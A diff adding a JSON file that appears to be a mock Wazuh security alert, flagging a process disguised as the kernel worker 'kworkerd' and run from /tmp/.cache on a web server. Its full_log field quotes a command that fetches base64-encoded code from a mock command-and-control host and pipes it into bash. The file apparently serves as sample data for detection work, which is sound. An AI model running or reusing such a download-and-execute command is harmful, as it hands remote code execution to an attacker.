@@ -1,0 +1,27 @@
+{
+  "id": "1727685480.20008",
+  "timestamp": "2026-09-30T08:38:00.000+0000",
+  "rule": {
+    "id": "100330",
+    "level": 10,
+    "description": "Suspicious process executed from a world-writable path (possible payload execution)",
+    "groups": ["audit", "process_execution", "vigix_custom"],
+    "firedtimes": 1,
+    "mitre": { "id": ["T1059.004"], "tactic": ["Execution"], "technique": ["Unix Shell"] }
+  },
+  "agent": { "id": "003", "name": "WEB-01", "ip": "10.0.3.10" },
+  "manager": { "name": "wazuh-manager" },
+  "decoder": { "name": "auditd" },
+  "location": "/var/log/audit/audit.log",
+  "data": {
+    "audit": {
+      "exe": "/tmp/.cache/kworkerd",
+      "command": "kworkerd",
+      "ppid": "1",
+      "uid": "33",
+      "auid": "0"
+    },
+    "process": "/tmp/.cache/kworkerd"
+  },
+  "full_log": "type=EXECVE msg=audit(1727685480.123:842): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"curl -s http://vigix-mock-c2.net/x | base64 -d | bash\" ; exe=\"/tmp/.cache/kworkerd\" uid=33(www-data) auid=0(root) ppid=1 — process running from a world-writable directory masquerading as a kernel worker"
+}
